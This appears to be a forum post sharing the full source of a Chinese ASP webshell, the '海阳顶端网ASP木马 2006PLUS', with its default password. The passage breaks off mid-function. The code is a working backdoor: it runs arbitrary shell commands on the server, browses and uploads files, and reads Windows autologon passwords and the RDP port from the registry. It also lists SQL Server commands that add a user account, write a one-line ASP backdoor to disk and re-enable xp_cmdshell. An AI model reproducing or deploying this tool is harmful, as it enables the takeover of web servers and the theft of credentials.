哇哈哈。。。
老马不肯给我我自已找到了！~~~嘿嘿。。。。
默认密码：hididi.net 

<object runat="server" id="ws" scope="page" classid = "clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="fso" scope="page" classid = "clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<object runat="server" id="ws" scope="page" classid = "clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="sa" scope="page" classid = "clsid:13709620-C279-11CE-A49E-444553540000"></object>
<%
Option Explicit
Response.Buffer=True
Dim i,url,conn,sUrlB,N,P,RP,PageSize,aspPath,bOtrUser,sSqlSelect,sImage
Dim sUrl,accessStr,G,sysFileList,isSqlServer,sP,F,A,W,Q,K
bOtrUser=false''是否需要其它NT用户身份登录
If bOtrUser=True And Trim(Request.ServerVariables("AUTH_USER"))="" Then
Response.Status="401 Unauthorized"
Response.Addheader "WWW-AuThenticate","BASIC"
If Request.ServerVariables("AUTH_USER")="" Then Response.End()
End If
N=R("N")
PageSize=20 ''默认每页记录数
isSqlServer=False
RP=Server.MapPath("/")
G=R("G")
url=Request.ServerVariables("URL") ''当前页的相对路径
sP="Packet.mdb" ''文件包默认文件名
P=Replace(R("P"),"\\","\")
aspPath=Replace(Server.MapPath(".")&"\~86.tmp","\\","\") ''系统临时文件
sysFileList="$"&sP&"$"&Left(sP,InStrRev(sP,".") - 1)&".ldb$"
accessStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
Q="<tr><td class=trHead colspan=2>&nbsp;</td></tr><tr><td align=right class=td colspan=2>Powered By Marcos 2005.11&nbsp;</td></tr></table>"
K="<table width=750 border=1><tr><td colspan=2 class=td><font face=webdings>8</font> {$s}</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
sSqlSelect="<select onchange=""if(this.form.sqlB)this.form.sqlB.value=this.value;else this.form.sql.value=this.value;""><option value=''>SQL Server常用命令列表<option value=""Declare @s  i;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(request(char(35)))%^>>c:\1.asp';"">SP_OAMethod执行命令"&_
 "<option value=""Exec XP_CMDShell 'net user lcx lcx /add'"">XP_CMDShell执行命令<option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))"&Chr(37)&">''' "">sp_makewebtask写文件"&_
 "<option value=""dbcc addextendedproc ('sp_OACreate','odsole70.dll')"">恢复sp_OACreate过程<option value=""dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"">恢复xp_cmdshell</select><br>"
Const s="" ''登录标志
Const m="HYTop2006+" ''Session标志
Const B=False 'False,True''是否调试模式
Const uPd="02200200251001" ''登录密码
Const FE="$gif$jpg$bmp$" ''图像后缀列表
Const EF="$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$"
    if G="img" then
Writepic("FFD8FFE000104A46494600010101006000600000FFDB0043000302020302020303030304030304050805050404050A070706080C0A0C0C0B0A0B0B0D0E12100D0E110E0B0B1016101113141515150C0F171816141812141514FFDB00430103040405040509050509140D0B0D1414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414FFC0001108004C006403012200021101031101FFC4001B0

0000105010100000000000000000000000600040507080302FFC40034100001030303030204040505000000000001020304000511061221073141135114226181083291A11523427172161752C1E1FFC4001B01000202030100000000000000000000000305020400010607FFC4002811000202020102050403000000000000000102001103211204310513225181141541F061A1B1FFDA000C03010002110311003F00AB3F0B7A1C45D2BFC59E47F32492A493ED56CDD1529E516A2E10D8E3BF7A79D3EB0A74FE83B4C542424B719008C79DA2BD4C92D461B9440F7354EECDCB0

A37505E641B90470147FC6A35832D877E70E21493EE68915AB2234EED5382BDB8EC7B8243ACA92BFEC68BF8D430D47369B83E1206F3D867353CDBE5C5652AEFC9A150E18E491C66A461CD524E4935ABB983BC26666292DED2738AF626ED5100E71CD0DBF76F4C103835C117E3186490BC9C62A22A4E131B80DF907F5AF48985EF9739A116B57C44BDE9ADB201F39CD4F5BEE515D4EF6DC0428F6F6A905BED22C446DAA0A7F843A93EF9C565AEA73EAB6B6D7385ADCDC49FAF35AB35242F52DEA29564609CFDAB27F59905FB9B6D00400E6081E051144A8E451322ADCFFC4

454AFD3049EE49C52A6B689E22C30DA8763C71F414AACEBDE2920DCDE36BB67AD6D6DA1C610122803A99A26F4DC35AED8E007079233B7ED56ADB886A3B69031814F5E920206E4050C7634BD08EC63E5524D89873A990AE9A4B44C6B82EE739DB9BD2034A5215B52D00093C7D71509D3DEB1CC45D2D3094A9135D59DB2CBA948C0CAB052477C242739F26B616B4D2961D531551E7DA90FB4A39523C13EF503A57A31A3AD6E2970F4E36CBAAE3D4DC738F6ABFCD0AD54AE7064562D723E6C777D5D841CE05398F09C0D8241C0A3D7F4E071E538A40C93E2BA2EC013194908

E48F154EADA5AD812AE9AA5A5447EF4C1D8AE3BD9479F145D75D38F6E38471EF5457593A9372D0F7A4DAADCCA46C412EC8707F57B01FF75831D990E6145986D2ECD2C10B47007BD3DB2BEFC77B0AC957B0F354CE99EACDFEFF0021C1143B310C35EA3E9DBF327040381E7BD5A5A2355B5A812DBA76AB3FD69F7F623C1A21438FBC8AE419010259F6F94E4D65C8EE825050769ACA7D6D2626AC7D1920FE6C56C2B1C342DA2B033F2F7358CBAE92C4AEA4DC12839083B38FA0ADFB181234441861256DE46554AADDE95F4725EAFD2E6E49427D35BEA4A0A8F8013FFB4AAD2

E2622EA2B39501AB9AF6190A4A40EF4FD313D447241CD40DBE7612327E82A620CB00E49FD693033A9C482A761A75B73E623EBCD741159829E4006BB3B73096800AE7CD0F4EBA32FCBD8EC84B284F04938E68D742CCC6166A4CB0A4C87B006454DAADC8F862A29ED43365991A33E7F9A169F073E28A665C5872161A701563B5623EEE4592841C9F6E69E42F0076AA93A93A16D5AB5019BC5B51200E1321036B89FBD59AEDD54CC90DBA0A7776CD29D6E6E7B791839E68C1EBB407104EC4A4B47745AD9A71A745A1F4B65E20A96E0F9F1ED45FA53A1F6FB7BEB7DB7036B70EE

504700ABDE899AB47C33B9C63FB510DB5CF476D13CC2F40C19C6A8095919360B7A52D1216E2BE569B2AC9FA0AC0D7965FD55AD25ADA6CADD952BD3481CE54A556CDEBA6A279BB126DF1017274D5069B6877550FF0047FF000E66DDA96D72AE49CAA2624BA71F99C3C81F6E6A68872352CA595D71632CE772F5E9BF4CA1E91D1369B5EC1BD9653BCFBAF1C9FD6951DE420048EC2953E0140A9C89624D999CA3CD5B0E290AFCC83822A619BB9090079A18BC5C1A7EF121D688DAA592A03C135E9B9C1090739AE42B73D130640F8C3C388AF87D3C9FDEA0B54E8845FD0E61F

5202C61412AC506DD3A862D32929F4DC523CA929240A918BD53B529282B969493DC138A2D8E3444D80E5B92C89896CBEE8A4298DCF4F8A0FC8B51CA923DB3E6A49ED53A9A2C74BD12DCB740393BCE38A2C89A9A15CA1A571A4B4E25439048A706F0CA00014850C7206315A0164DDB228D891A9D48F6A1871DE7D8F41F6FF354C5BAE7B5B1935133A6C5F4545B2127D8544C4BB27C2BB561D08356E4DB10ED531B792338FB5744AD2DA5447B714231AE7BD63E6A22B1DD21A6EF6F45C145311D7D2DA958E327B0344C60B10243390AA4FB49ED2FD358B76BEB5A9E6A4C8F

41BDAC34AEC957922BC0B94CD64E5CA3DBDC5599519CC9CF0E28F83FE356ADD9C62CB6AD8D0436CE363607624D567ACAC3192987736E4AE12C0224168E3D5687241FD3BD3E387CB40A3E6720DD479EE59BE3F88C7FDE9B2DB5298D727D4CCD6C6D7500123238EF4AA82D65ACAD336EC97A24980DB2A6C612B1957E6577FDA952E3D732EB90FDF98C8785F21C8A36FF007DA0F9BEBEEEAA5B6CAFF92D03EA0FF9134531662DD291BBE5355CE9B515DC66ACF2A53EAC9FBE28B9B754D3A9DA700F7A520C6B88705004B0605BA24C8FB54849563B9150379D1301DDC7E110

17F41C1A736894E2718346B09A4498E3D44856451D7D421D72321B129F46927219288EB7596D5FD295702BAB5A6751415FA90E697107BB6F73567CE80C215908C5716FE442B03E95B0A215BAC661444AD22DCEF11EE0A8F716C253E1493C1A9C6D676E53C1CD74D4582BDD81907BE29BDB945DD9BA827BC186D5C24D376E97789ECC48CD29E7DD504A5291C935AE2D9F879B64DE9926D32486EECEE247C601CB6F78FB0ED8A02FC3C69D831AEB1A5A5ADCF946EDEAE71C78AD2B01E52D2A07B6699E04A5E43BCE53AEF102F9C610280FF66514DBF51447FF00D337843A65

5B1E5FA921CECF249F91693E460D07FE207519D37A0E6104871C6FE1593F55773FA035AE7A9B6D8EEDB1B9AA6C7C4A15E98707729E783594FAE16A8D78D3C98D29B0E32A59E3D8FBD5DCCEC7A662BDEA47A5C887AB41947A6C5D4C2B779ACFC437E98C0F4C649F279A54BAC0CB3A735346890594219F8342CEE1924952F9FD852AE1FE91CEEC4F5BFBD74CBE908DFD4FFFD9")
response.end
end if

Sub O(sStr)
Response.Write sStr
End Sub
Sub IsIn()
If Session(m&"uPd")<>uPd Then
O "<script>alert('没有权限的访问,请先登录!');location.href='"&url&"';</script>"
Response.End()
End If
End Sub
Function Y(var,val1,val2)
If var=True Then Y=val1 Else Y=val2
End Function
Sub RedirectTo(url)
Response.Redirect(url)
End Sub
Function StrEncode(s)
s=C(s)
s=Replace(s," ","&nbsp;")
s=Replace(s,"","&nbsp;&nbsp;&nbsp;&nbsp;")
s=Replace(s,vbNewLine,"<br>")
StrEncode=s
End Function
Sub CreateObj(F,A,W)
On Error Resume Next
Set W=Server.CreateObject("WScript.Shell")
Set A=Server.CreateObject("Shell.Application")
Set F=Server.CreateObject("Scripting.FileSystemObject")
If IsEmpty(A) Then Set A=sa
If IsEmpty(F) Then Set F=fso
If IsEmpty(W) Then Set W=ws
If Err Then Err.Clear
End Sub
Function StreamLoadFromFile(sPath)
Dim M
If B=False Then On Error Resume Next
Set M=Server.CreateObject("adodb.Stream")
With M
.Type=2
.Mode=3
.Open
.LoadFromFile sPath
If Request("G")<>"TxtSearcher" Then ChkErr(Err)
.Charset="gb2312"
.Position=2
StreamLoadFromFile=.ReadText()
.Close
End With
Set M=Nothing
End Function
Sub JavaScript(sStr)
Response.Write(vbNewLine&"<script type=""text/javascript"">"&sStr&"</script>"&vbNewLine)
End Sub
Function R(var)
Dim val
If Request.QueryString("G")="PageUpload" Then
G="PageUpload"
Exit Function
End If
val=RTrim(Request.Form(var))
If val="" Then val=RTrim(Request.QueryString(var))
R=val
End Function
Function C(s)
If IsNull(s) Then Exit Function
C=Server.HTMLEncode(s)
End Function
Function U(s)
If IsNull(s) Then Exit Function
U=Server.URLEncode(s)
End Function
Sub ST(s)
Response.Write "<title>"&s&" - 海阳顶端网ASP木马＠2006PLUS - By Marcos</title>"
Response.Write "<meta http-equiv='Content-Type' content='text/html;charset=gb2312'>"
End Sub
Function GetTheSize(n)
Dim i,aSize(4)
aSize(0)="B"
aSize(1)="KB"
aSize(2)="MB"
aSize(3)="GB"
aSize(4)="TB"
While(n/1024>=1)
n=n/1024
i=i+1
WEnd
GetTheSize=Fix(n * 100)/100&" "&aSize(i)
End Function
Sub ShowErr(s)
Dim i,aStr
s=C(s)
aStr=Split(s,"$$")
%>
<font size=2>
出错信息:<br><br>
<%
For i=0 To UBound(aStr)
O "&nbsp;&nbsp;"&(i+1)&". "&aStr(i)&"<br>"
Next
%>
</font>
<%
Response.End()
End Sub
Sub CreateFolder(sPath)
Dim i
i=InStr(Mid(sPath,4),"\")+3
Do While i>0
If F.FolderExists(Left(sPath,i))=False Then F.CreateFolder(Left(sPath,i - 1))
If InStr(Mid(sPath,i+1),"\") Then i=i+InStr(Mid(sPath,i+1),"\") Else i=0
Loop
End Sub
Sub AlertThenClose(s)
If s="" Then
Response.Write "<script>window.close();</script>"
 Else
Response.Write "<script>alert("""&s&""");window.close();</script>"
End If
End Sub
Sub ChkErr(Err)
If Err Then
O "<hr style='color:#d8d8f0;'/><font size=2><li>错误: "&Err.Description&"</li><li>错误源: "&Err.Source&"</li><br>"
%>
<hr style='color:#d8d8f0;'/>&nbsp;By Marcos 2005.11</font>
<%
Err.Clear
Response.End
End If
End Sub
Sub TopMenu()
O "<form method=post name=formp action="""&url&""">"
%><select name=G onchange=if(this.value!='')changePage(this);>
<option value=''>请选择功能页面</option>
<option value=PageCheck>服务器信息探针</option>
<option value=PageServiceList>系统服务列表</option>
<option value=PageUserList>系统用户(组)列表</option>
<option value=PageFso>FSO文件浏览操作器</option>
<option value=PageApp>APP文件浏览操作器</option>
<option value=PageDBTool>数据库操作器</option>
<option value=PagePack>文件夹打包/解开器</option>
<option value=PageUpload>批量文件上传</option>
<option value=PageSearch>文本文件搜索器</option>
<option value=PageWebProxy>HTTP协议网页代理</option>
<option value=PageExecute>自定义ASP语句运行</option>
<option value=PageCSInfo>客户端服务器交互信息</option>
<option value=PageWsCmdRun>WScript.Shell命令行操作</option>
<option value=PageSaCmdRun>Shell.Application命令行</option>
<option value=PageOtrTools>其它一些零碎的小工具</option>
<option value=PageOut>退出系统</option>
</select>
</form>
<script language=javascript>
<%
O "function document.onreadystatechange(){if(document.readyState!='complete') return;"&vbNewLine
O "formp.G.value='"&G&"';"&Y(G=s,"formp.G.value='PageExecute';formp.submit();","")&"}"
%>
function changePage(o){
if(o.value=='PageOut')
if(!confirm('确认要退出系统吗?'))return;
if(o.value=='PageWebProxy')o.form.target='_blank';
<%
O "o.form.submit();o.form.target='';"&vbNewLine
%>
if(o.value!='PageWebProxy' && o.value!='PageOut')o.disabled=true;
}
</script>
<%
End Sub
Rem ++++++++++++++++++++++++++++++++++++
Rem 以下是页面选择部分
Rem ++++++++++++++++++++++++++++++++++++
Call CreateObj(F,A,W)
Response.Clear
PageOtr()
If G<>"" And G<>s Then
IsIn()
TopMenu()
End If
If G="" And s<>"" Then
sUrl="http://hididi.net/NoExists.html"
'sUrl="http://"&Request.ServerVariables(" ... mp;"/NoExists.html"
PageWebProxy()
End If
Select Case G
Case "PageSearch"
PageSearch()
Case "PageServiceList"
PageServiceList()
Case "PageUserList"
PageUserList()
Case "PageCheck"
PageCheck()
Case "PageFso"
PageFso()
Case "PageApp"
PageApp()
Case "PageDBTool"
PageDBTool()
Case "PageUpload"
PageUpload()
Case "PageWsCmdRun"
PageWsCmdRun()
Case "PageSaCmdRun"
PageSaCmdRun()
Case "PagePack"
PagePack()
Case "PageExecute"
PageExecute()
Case "PageCSInfo"
PageCSInfo()
Case "PageOtrTools"
PageOtrTools()
Case "PageWebProxy"
PageWebProxy()
Case s,"PageOut"
PageLogin()
End Select
Set F=Nothing
Set A=Nothing
Set W=Nothing
Rem +++++++++++++++++++++++++++++++++++++
Rem 以下是各功能模块部分
Rem +++++++++++++++++++++++++++++++++++++
Sub PageWsCmdRun()
Dim cmdStr,cmdPath,cmdResult
cmdStr=Request("cmdStr")
cmdPath=Request("cmdPath")
ST("WScript.Shell命令行操作")
If cmdPath="" Then
cmdPath="cmd.exe"
End If
If N="PackIt" And cmdStr<>"" Then
Server.ScriptTimeOut=999999
cmdStr="c:\progra~1\WinRAR\Rar.exe a """&cmdStr&"\Packet.rar"" """&cmdStr&"""" '自定义rar路径
cmdStr=Replace(cmdStr,"\\","\")
End If
If cmdStr<>"" Then
If InStr(LCase(cmdPath),"cmd.exe")>0 Then
cmdResult=DoWsCmdRun(cmdPath&" /c "&cmdStr)
 Else
 If LCase(cmdPath)="wscriptshell" Then
cmdResult=DoWsCmdRun(cmdStr)
 Else
cmdResult=DoWsCmdRun(cmdPath&" "&cmdStr)
End If
End If
End If
%>
<body onload="document.forms[1].cmdStr.focus();">
<form method=post onSubmit='this.Submit.disabled=true'><input type=hidden name=G value='PageWsCmdRun' />
<%
O Replace(K,"{$s}","WScript.Shell命令行操作")
O "<tr><td colspan=2>&nbsp;路径: <input name=cmdPath type=text id=cmdPath value="""&C(cmdPath)&""" size=50> "
%><input type=button name=Submit2 value=使用WScript.Shell onClick="this.form.cmdPath.value='WScriptShell';"></td></tr>
<%
O "<tr><td colspan=2>&nbsp;命令/参数: <input name=cmdStr type=text id=cmdStr value="""&C(cmdStr)&""" size=62> "
%><input type=submit name=Submit value=' 运行 '></td><tr>
<tr><td colspan=2 style='line-height:21px;'>&nbsp;注:请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.</td></tr>
<tr><td colspan=2>&nbsp;<textarea id=cmdResult style='width:735px;height:400px;'>
<%
O C(cmdResult)
%></textarea></td></tr>
<%=Q%>
</form>
</body>
<%
End Sub
Function DoWsCmdRun(cmdStr)
If B=False Then On Error Resume Next
Dim oFile
doWsCmdRun=W.Exec(cmdStr).StdOut.ReadAll()
If Err Then
O Err.Description&"<br>"
Err.Clear
W.Run cmdStr&">"&aspPath,0,True
Set oFile=F.OpenTextFile(aspPath)
DoWsCmdRun=oFile.RealAll()
If Err Then
O Err.Description&"<br>"
Err.Clear
DoWsCmdRun=StreamLoadFromFile(aspPath)
End If
End If
End Function
Sub PageSaCmdRun()
If B=False Then On Error Resume Next
Dim tFile,appPath,appName,appArgs
ST("Shell.Application 命令行操作")
appPath=Trim(Request("appPath"))
appName=Trim(Request("appName"))
appArgs=Trim(Request("appArgs"))
If N="doAct" Then
If appName="" Then appName="cmd.exe"
If appPath<>"" And Right(appPath,1)<>"\" Then
appPath=appPath&"\"
End If
If LCase(appName)="cmd.exe" And appArgs<>"" Then
If LCase(Left(appArgs,2))<>"/c" Then
appArgs="/c "&appArgs
End If
Else
If LCase(appName)="cmd.exe" And appArgs="" Then
appArgs="/c "
End If
End If
A.ShellExecute appName,appArgs,appPath,"",0
'Response.Write("A.ShellExecute "&appName&","&appArgs&","&appPath&","""",0")
chkErr(Err)
End If
If N="readResult" Then
Err.Clear
Response.Clear
Response.Write("<style>body{font-size:12px;}</style>"&vbNewLine)
O StrEncode(MLoadFromFile(aspPath))
If Err Then
Err.Clear
Set tFile=fsoX.OpenTextFile(aspPath)
O StrEncode(tFile.ReadAll())
Set tFile=Nothing
End If
Response.End()
End If
%>
<body onload="document.forms[1].appArgs.focus();setTimeout('wsLoadIFrame();',3900);">
<form method=post onSubmit='this.Submit.disabled=true'><input type=hidden name=N value=doAct><input type=hidden name=G value=PageSaCmdRun />
<%
O "<input type=hidden name=aspPath value="""&C(aspPath)&""">"
O Replace(K,"{$s}","Shell.Application 命令行操作")
O "<tr><td colspan=2>&nbsp;所在路径: <input name=appPath type=text id=appPath value="""&C(appPath)&""" size=62></td></tr>"
O "<tr><td colspan=2>&nbsp;程序文件: <input name=appName type=text id=appName value="""&C(appName)&""" size=62> "
%><input type=button name=Submit4 value=' 回显 ' onClick="this.form.appArgs.value+='>'+this.form.aspPath.value;"></td></tr>
<%
O "<tr><td colspan=2>&nbsp;命令参数: <input name=appArgs type=text id=appArgs value="""&C(appArgs)&""" size=62> "
%><input type=submit name=Submit value=' 运行 '></td></tr>
<tr><td colspan=2>&nbsp;注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用">"符号),其它程序只能执行不能回显.<br>
&nbsp;由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.</td></tr>
<tr><td colspan=2 style='padding-top:6px;'>&nbsp;<iframe id=cmdResult style='width:733px;height:400px;'>
</iframe></td></tr>
<%=Q%>
</form>
</body>
<%
End Sub
Sub PageSearch()
Dim sKey,sPath
sKey=R("Key")
Server.ScriptTimeout=5000
If P="" Then P=RP
ST("文本文件搜索器")
SearchTable(sKey)
If N<>"" And sKey<>"" Then
SearchIt(sKey)
End If
End Sub
Sub SearchTable(sKey)
O "<form method=post action='"&url&"'>"
%><input type=hidden value=PageSearch name=G>
<%
O Replace(K,"{$s}","文本文件搜索器(需FSO支持)")
%>
<tr>
<td>&nbsp;路径</td>
<td>&nbsp;<input name=P type=text id=P value="
<%
O C(P)
%>
" style='width:360px;'>
</td>
</tr>
<tr>
<td width='20%'>&nbsp;关键字</td>
<%
O "<td>&nbsp;<input name=Key type=text value='"&C(sKey)&"' id=Key style='width:400px;'> "
%><select name=N id=N>
<option value=FileName selected>仅文件名</option>
<option value=FileContent>仅文本内容</option>
<option value=Both>两者都</option>
</select>
 <input type=submit name=Submit value=提交> </td>
</tr>
<%=Q%>
</form>
<%
End Sub
Sub SearchIt(key)
Dim sPath,tFolder
Response.Buffer=True
sPath=P
If F.FolderExists(sPath)=False Then
ShowErr(P&" 目录不存在或者不允许访问!")
End If
Set tFolder=F.GetFolder(sPath)
%>
<br><div style='width:750;border:1px solid #d8d8f0;'>
<%
Select Case N
Case "Both"
Call SearchFolder(tFolder,key,1)
Case "FileName"
Call SearchFolder(tFolder,key,2)
Case "FileContent"
Call SearchFolder(tFolder,key,3)
End Select
%>
</div>
<%
Set tFolder=Nothing
End Sub
Sub SearchFolder(folder,key,flag)
Dim ext,title,tFile,tFolder
For Each tFile In folder.Files
ext=LCase(F.GetExtensionName(tFile.Path))
If flag=1 Or flag=2 Then
If InStr(LCase(tFile.Name),LCase(key))>0 Then O FileLink(tFile,"")
End If
If flag=1 Or flag=3 Then
If InStr(EditableFileExt,"$"&ext&"$")>0 Then
If SearchFile(tFile,key,title) Then O FileLink(tFile,title)
End If
End If
Next
Response.Flush()
For Each tFolder In folder.SubFolders
Call SearchFolder(tFolder,key,flag)
Next
End Sub
Function SearchFile(f,s,title)
Dim tFile,content,pos1,pos2
If B=False Then On Error Resume Next
Set tFile=F.OpenTextFile(f.Path)
content=tFile.ReadAll()
tFile.Close
Set tFile=Nothing
If Err Then Err.Clear
SearchFile=InStr(1,content,s,1) 
If SearchFile>0 Then
pos1=InStr(1,content,"<TITLE>",1)
pos2=InStr(1,content,"</TITLE>",1)
title=""
If pos1>0 And pos2>0 Then
title=Mid(content,pos1+7,pos2 - pos1 - 7)
End If
End If
End Function
Function FileLink(file,title)
fileLink=file.Path
If title="" Then
title=file.Name
End If
fileLink="&nbsp;<font color=ff0000>"&title&"</font> "&fileLink&"<br>"
End Function
Sub PageCheck()
ST("服务器信息探针")
Response.Flush()
InfoCheck()
Response.Flush()
ObjCheck()
Response.Flush()
GetSrvDrvInfo()
Response.Flush()
End Sub
Sub InfoCheck()
Dim aCheck(7),sExEnvList,aExEnvList
If B=False Then On Error Resume Next
sExEnvList="ClusterLog$SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$"&_
 "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
aExEnvList=Split(sExEnvList,"$")
aCheck(0)=Server.ScriptTimeOut()&"(秒)"
aCheck(1)=FormatDateTime(Now(),0)
aCheck(2)=Request.ServerVariables("SERVER_NAME")
aCheck(2)=aCheck(2)&","&Request.ServerVariables("LOCAL_ADDR")
aCheck(2)=aCheck(2)&":"&Request.ServerVariables("SERVER_PORT")
aCheck(3)=Request.ServerVariables("OS")
aCheck(3)=Y(aCheck(3)="","Windows2003",aCheck(3))&","&Request.ServerVariables("SERVER_SOFTWARE")
aCheck(3)=aCheck(3)&","&ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion
aCheck(4)=RP
aCheck(4)=aCheck(4)&","&GetTheSize(F.GetFolder(RP).Size)
aCheck(5)="Path: "&Request.ServerVariables("PATH_TRANSLATED")&"<br>"
aCheck(5)=aCheck(5)&"&nbsp;Url : http://"&Request.ServerVariables("SERVER_N ... .ServerVariables("Url")
aCheck(6)="变量数: "&Application.Contents.Count()&","
aCheck(6)=aCheck(6)&" 会话数: "&Session.Contents.Count&","
aCheck(6)=aCheck(6)&" 当前会话ID: "&Session.SessionId()&"<br>"
aCheck(6)=aCheck(6)&"&nbsp;服务器内存: "&GetTheSize(A.GetSystemInformation("PhysicalMemoryInstalled"))&","
aCheck(6)=aCheck(6)&"&nbsp;计"&W.Environment("SYSTEM")("NUMBER_OF_PROCESSORS")&"个CPU("&W.Environment("SYSTEM")("PROCESSOR_IDENTIFIER")&")"
O Replace(K,"{$s}","服务器基本信息")
%>
<tr class=td>
<td width='20%'>&nbsp;项目</td>
<td>&nbsp;值</td>
</tr>
<tr>
<td>&nbsp;默认超时</td>
<%
O "<td>&nbsp;"&aCheck(0)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;当前时间</td>
<%
O "<td>&nbsp;"&aCheck(1)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;服务器名</td>
<%
O "<td>&nbsp;"&aCheck(2)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;软件环境</td>
<%
O "<td>&nbsp;"&aCheck(3)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;站点目录</td>
<%
O "<td>&nbsp;"&aCheck(4)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;当前路径</td>
<%
O "<td>&nbsp;"&aCheck(5)&"</td>"
%>
</tr>
<tr><td>&nbsp;终端服务端口<br>&nbsp;及自动登录信息</td><td>
<%
GetTerminalInfo()
%>
</td></tr>
<tr>
<td>&nbsp;其它</td>
<%
O "<td>&nbsp;"&aCheck(6)&"</td>"
%>
</tr>
<tr>
<td>&nbsp;环境变量</td>
<td style='padding-left:7px;'>
<%
For i=0 To UBound(aExEnvList)
O aExEnvList(i)&": "&W.ExpandEnvironmentStrings("%"&aExEnvList(i)&"%")&"<br>"
Next
%>
</td>
</tr>
<%
O Q
End Sub
Sub GetSrvDrvInfo()
If B=False Then On Error Resume Next
Dim oTheDrive
%>
<br>
<%
O Replace(Replace(K,"{$s}","服务器磁盘信息"),"=2","=6")
%>
<tr class=td align=center>
<td>盘符</td>
<td>类型</td>
<td>卷标</td>
<td>文件系统</td>
<td>可用空间</td>
<td>总空间</td>
</tr>
<%
For Each oTheDrive In F.Drives
%>
<tr align=center><td>
<%
O oTheDrive.DriveLetter
%>
</td><td>
<%
O GetDriveType(oTheDrive.DriveType)
%>
</td><td>
<%
O oTheDrive.VolumeName
%>
</td><td>
<%
O oTheDrive.FileSystem
%>
</td><td>
<%
O GetTheSize(oTheDrive.FreeSpace)
%>
</td><td>
<%
O GetTheSize(oTheDrive.TotalSize)
%>
</td></tr>
<%
If Err Then Err.Clear
Next
O Replace(Q,"=2","=6")
Set oTheDrive=Nothing
End Sub
Function GetDriveType(n)
Select Case n
Case 0
GetDriveType="未知"
Case 1
GetDriveType="可移动磁盘"
Case 2
GetDriveType="本地硬盘"
Case 3
GetDriveType="网络磁盘"
Case 4
GetDriveType="CD-ROM"
Case 5
GetDriveType="RAM 磁盘"
End Select
End Function
Sub GetTerminalInfo()
If B=False Then On Error Resume Next
Dim terminalPortPath,terminalPortKey,termPort
Dim autoLoginPath,autoLoginUserKey,autoLoginPassKey
Dim isAutoLoginEnable,autoLoginEnableKey,autoLoginUsername,autoLoginPassword
terminalPortPath="HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey="PortNumber"
termPort=W.RegRead(terminalPortPath&terminalPortKey)
If termPort="" Or Err.Number<>0 Then 
O  "&nbsp;无法得到终端服务端口,请检查权限是否已经受到限制.<br>"
 Else
O  "&nbsp;当前终端服务端口: "&termPort&"<br>"
End If
autoLoginPath="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey="AutoAdminLogon"
autoLoginUserKey="DefaultUserName"
autoLoginPassKey="DefaultPassword"
isAutoLoginEnable=W.RegRead(autoLoginPath&autoLoginEnableKey)
If isAutoLoginEnable=0 Then
O  "&nbsp;系统自动登录功能未开启"
Else
autoLoginUsername=W.RegRead(autoLoginPath&autoLoginUserKey)
O  "&nbsp;自动登录的系统帐户: "&autoLoginUsername&"<br>"
autoLoginPassword=W.RegRead(autoLoginPath&autoLoginPassKey)
If Err Then
Err.Clear
O  "False"
End If
O  "&nbsp;自动登录的帐户密码: "&autoLoginPassword&"<br>"
End If
End Sub
Sub ObjCheck()
Dim aObj(19)
Dim x,oTmp,tObj,sObj
If B=False Then On Error Resume Next
sObj=Trim(getPost("TheObj"))
aObj(0)="MSWC.AdRotator|广告轮换组件"
aObj(1)="MSWC.BrowserType|浏览器信息组件"
aObj(2)="MSWC.NextLink|内容链接库组件"
aObj(3)="MSWC.Tools|"
aObj(4)="MSWC.Status|"
aObj(5)="MSWC.Counters|计数器组件"
aObj(6)="MSWC.PermissionChecker|权限检测组件"
aObj(7)="Adodb.Connection|ADO 数据对象组件"
aObj(8)="CDONTS.NewMail|虚拟 SMTP 发信组件"
aObj(9)="Scripting.FileSystemObject|FSO组件"
aObj(10)="Adodb.Stream|Stream 流组件"
aObj(11)="Shell.Application|"
aObj(12)="WScript.Shell|"
aObj(13)="Wscript.Network|"
aObj(14)="ADOX.Catalog|"
aObj(15)="JMail.SmtpMail|JMail 邮件收发组件"
aObj(16)="Persits.Upload.1|ASPUpload 文件上传组件"
aObj(17)="LyfUpload.UploadFile|刘云峰的文件上传组件组件"
aObj(18)="SoftArtisans.FileUp|SA-FileUp 文件上传组件"
aObj(19)=sObj&"|您所要检测的组件"
%>
<br>
<%
O Replace(Replace(K,"{$s}","服务器组件信息"),"=2","=3")
%>
<tr class=td>
<td>&nbsp;组件<font color=#666666>(描述)</font></td>
<td width=10% align=center>支持</td>
<td width=15% align=center>版本</td>
</tr>
<%
For Each x In aObj
tObj=Split(x,"|")
If tObj(0)="" Then Exit For
Set oTmp=Server.CreateObject(tObj(0))
